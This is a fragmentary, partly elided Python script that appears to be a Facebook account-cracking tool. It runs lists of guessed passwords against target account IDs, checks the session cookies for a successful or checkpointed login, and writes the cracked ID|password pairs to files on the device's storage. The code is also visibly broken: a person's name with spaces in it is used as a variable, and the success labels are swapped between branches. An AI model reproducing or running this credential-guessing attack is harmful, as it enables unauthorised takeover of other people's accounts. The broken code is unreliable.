...
try:
	...
	os.system('python DISHA SALMANI .py')
ugen = []
...
def fia():    
			...
			if xd in ['1','01']:
				os.system('clear')
				print(logo)
				print('Example : /sdcard/DISHA SALMANI .txt')
				linex()
				...
				os.system(f'xdg-open https://www.facebook.com/profile.php?id=100085563307057/');menu()
			elif xd in ['0','00']:
				exit()
			else:
...
def mmm(ids,names,passlist):
	...
	try:
		...
		for fikr in passlist:
			...
			DISHA SALMANI =session.cookies.get_dict().keys()
			if "c_user" in DISHA SALMANI :
				print('\r\r\033[1;31m[DISHA SALMANI -CP] %s | %s'%(ids,pas))
				
				open('/sdcard/DISHA SALMANI -CP.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in DISHA SALMANI :
				if 'y' in pcp:
					print('\r\r\x1b[1;92m[DISHA SALMANI -OK] '+ids+' | '+pas+'\033[1;97m')
					
					open('/sdcard/DISHA SALMANI -OK.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in DISHA SALMANI :
				...
				print('\r\r\033[1;32m[DISHA SALMANI -OK] %s | %s'%(ids,pas))
				...
				if 'y' in pcp:
					print('\r\r\x1b[38;5;208m[DISHA SALMANI -CP] '+ids+' | '+pas+'\033[1;97m')
	...
	try:
		for ps in pwx:
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\33[38;5;208m[DISHA SALMANI -CP] '+cid+' | '+ps+'\033[1;32m')
				...
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\x1b[1;92m[DISHA SALMANI -OK] '+cid+' | '+ps+'\33[0;97m')
